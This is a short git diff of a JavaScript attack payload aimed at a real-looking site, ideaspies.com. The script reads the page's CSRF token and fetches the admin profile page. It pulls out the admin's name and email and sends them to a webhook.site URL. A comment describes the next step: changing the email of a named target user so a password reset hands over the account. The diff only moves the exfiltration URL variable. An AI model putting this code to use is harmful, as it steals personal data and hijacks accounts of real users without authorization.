@@ -2,6 +2,7 @@
 let token = $('meta[name="csrf-token"]').attr('content')
 let targetUsername = 'felix heng'
 let targetEmail = 'ideaspy1001@gmail.com'
+let receiver = 'https://webhook.site/8723bbba-a23b-4937-b358-bc98f05698a2'
 let email = ''
 let name = ''
 
@@ -33,7 +34,6 @@ fetch("https://ideaspies.com/user/admin/profile", {
 	
 	name = doc.querySelector('#first_name').getAttribute('value');
 	email = doc.querySelector('#email').getAttribute('value');
-	let receiver = 'https://webhook.site/8723bbba-a23b-4937-b358-bc98f05698a2' // don't forget to change this
 	return fetch(receiver + '?email=' + email + '&name=' + name, {'mode':'no-cors'});
 }).then(function(response){
 	// Change email if username matches target, server automatically sets new password and uses stored email to change the profile back to normal
